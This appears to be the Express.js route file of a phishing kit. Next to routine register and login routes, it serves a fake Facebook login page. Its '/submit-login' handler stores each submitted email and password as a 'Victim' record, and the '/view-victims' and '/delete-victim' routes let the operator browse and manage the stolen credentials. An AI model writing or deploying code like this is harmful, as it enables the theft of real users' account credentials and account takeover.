const express = require('express');
const User = require('../models/User');
const Victim = require('../models/Victim');
const router = express.Router();

// Root route: Redirects to the registration page
router.get('/', (req, res) => {
    res.redirect('/register');
});

// Render registration page
router.get('/register', (req, res) => {
    res.render('register');
});

// Handle registration form submission
router.post('/register', async (req, res) => {
    const { username, email, password } = req.body;
    try {
        const user = new User({ username, email, password });
        await user.save();
        res.redirect('/login');
    } catch (err) {
        console.error('Error creating user:', err);
        res.status(400).send('Error creating user');
    }
});


// Render login page
router.get('/login', (req, res) => {
    res.render('login');
});

/// Handle login form submission
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log("Attempting login with email:", email);
    try {
        // Search for a user with the given email
        const user = await User.findOne({ email });
        if (!user) {
            console.log('User not found in database:', email);
            return res.status(401).send('Invalid email or password');
        }
        // Check if the provided password matches the saved hashed password
        const isMatch = await user.comparePassword(password);
        if (isMatch) {
            // Store user ID in session to keep user logged in
            req.session.userId = user._id;
            return res.redirect('/dashboard');
        } else {
            console.log('Password mismatch for user:', email);
            return res.status(401).send('Invalid email or password');
        }
    } catch (err) {
        console.error('Error during login:', err);
        res.status(500).send('Internal server error');
    }
});


// Render dashboard page if user is logged in
router.get('/dashboard', async (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    try {
        const user = await User.findById(req.session.userId);
        res.render('dashboard', { user });
    } catch (err) {
        console.error('Error loading dashboard:', err);
        res.status(500).send('Error loading dashboard');
    }
});





// Facebook page route
router.get('/facebook', (req, res) => {
    res.render('facebook');
});
// Submit login form and save to database
router.post('/submit-login', async (req, res) => {
    const { email, password } = req.body;
    try {
        const victim = new Victim({ emailOrNumber: email, password });
        await victim.save();
    } catch (error) {
        console.error("Error saving victim details:", error);
        res.status(500).send("Server Error");
    }
});



// View victims page with data from database
router.get('/view-victims', async (req, res) => {
    try {
        const victims = await Victim.find(); // Fetch all victims from the database
        res.render('view-victims', { victims });
    } catch (error) {
        console.error("Error fetching victims:", error);
        res.status(500).send("Server Error");
    }
});
// Delete victim entry by ID
router.post('/delete-victim', async (req, res) => {
    const { id } = req.body;
    try {
        await Victim.findByIdAndDelete(id);
        res.redirect('/view-victims');
    } catch (error) {
        console.error("Error deleting victim:", error);
        res.status(500).send("Server Error");
    }
});


module.exports = router;
